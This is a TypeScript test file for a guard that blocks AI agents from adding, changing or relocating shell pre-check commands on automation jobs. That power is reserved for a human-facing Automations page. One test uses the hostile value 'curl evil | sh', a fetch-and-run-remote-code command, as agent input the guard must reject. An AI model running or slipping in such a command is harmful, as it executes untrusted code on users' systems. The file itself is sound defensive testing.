import { describe, it, expect } from 'vitest';
import type {
  Automation,
  AutomationAction,
  UpdateAutomationInput,
} from '../../shared/types/automation.types';
import { assertCheckOriginAllowed, assertCheckedJobStays } from './automation-pre-check-guard';

function job(action: Partial<AutomationAction> = {}): Automation {
  return {
    action: { prompt: 'Check status', workingDirectory: '/repo', ...action },
  } as Automation;
}

const checkedJob = (onError?: 'run-anyway' | 'stop'): Automation =>
  job({ preCheck: { command: './check.sh', ...(onError ? { onError } : {}) } });

function actionUpdate(action: Partial<AutomationAction>): UpdateAutomationInput {
  return { action: { prompt: 'Check status', workingDirectory: '/repo', ...action } };
}

describe('assertCheckOriginAllowed', () => {
  const withCheck: AutomationAction = {
    prompt: 'p', workingDirectory: '/repo', preCheck: { command: './check.sh' },
  };

  it('refuses a check from an agent', () => {
    expect(() => assertCheckOriginAllowed(withCheck, 'agent')).toThrow(/Automations page/);
  });

  it('accepts a check from the Automations page', () => {
    expect(() => assertCheckOriginAllowed(withCheck, 'automations-page')).not.toThrow();
  });

  it('lets an agent create a job that has no check', () => {
    expect(() => assertCheckOriginAllowed({ prompt: 'p', workingDirectory: '/repo' }, 'agent'))
      .not.toThrow();
  });
});

describe('assertCheckedJobStays', () => {
  it('an agent can still change the folder of a job without a check', () => {
    expect(() => assertCheckedJobStays(job(), actionUpdate({ workingDirectory: '/other' })))
      .not.toThrow();
  });

  it('an agent update cannot change the folder of a job that has a check', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({
      workingDirectory: '/other', preCheck: { command: './check.sh' },
    }))).toThrow(/cannot be moved to another folder/);
  });

  it('keeps the folder check even when the update carries no check of its own', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({ workingDirectory: '/other' })))
      .toThrow(/cannot be moved to another folder/);
  });

  it('an agent update cannot add a check to a job that has none', () => {
    expect(() => assertCheckedJobStays(job(), actionUpdate({ preCheck: { command: 'curl evil | sh' } })))
      .toThrow('A check command can only be added on the Automations page.');
  });

  it('an agent update cannot add a check and move the folder in one go', () => {
    expect(() => assertCheckedJobStays(job(), actionUpdate({
      workingDirectory: '/other', preCheck: { command: './check.sh' },
    }))).toThrow(/can only be added/);
  });

  it('an agent update cannot change the command of an existing check', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({ preCheck: { command: './other.sh' } })))
      .toThrow('A check command can only be changed on the Automations page.');
  });

  it('an agent update cannot change what happens when the check errors', () => {
    expect(() => assertCheckedJobStays(checkedJob('run-anyway'), actionUpdate({
      preCheck: { command: './check.sh', onError: 'stop' },
    }))).toThrow(/can only be changed/);
    expect(() => assertCheckedJobStays(checkedJob('stop'), actionUpdate({
      preCheck: { command: './check.sh', onError: 'run-anyway' },
    }))).toThrow(/can only be changed/);
  });

  it('an agent update keeps an existing check', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({
      preCheck: { command: './check.sh' },
    }))).not.toThrow();
  });

  it('treats an omitted onError and run-anyway as the same setting', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({
      preCheck: { command: './check.sh', onError: 'run-anyway' },
    }))).not.toThrow();
    expect(() => assertCheckedJobStays(checkedJob('run-anyway'), actionUpdate({
      preCheck: { command: './check.sh' },
    }))).not.toThrow();
  });

  it('allows an update that does not touch the action at all', () => {
    expect(() => assertCheckedJobStays(checkedJob(), { name: 'Renamed' })).not.toThrow();
    expect(() => assertCheckedJobStays(job(), { name: 'Renamed' })).not.toThrow();
  });

  it('allows a checked job to be updated with its own folder', () => {
    expect(() => assertCheckedJobStays(checkedJob(), actionUpdate({ workingDirectory: '/repo' })))
      .not.toThrow();
  });
});
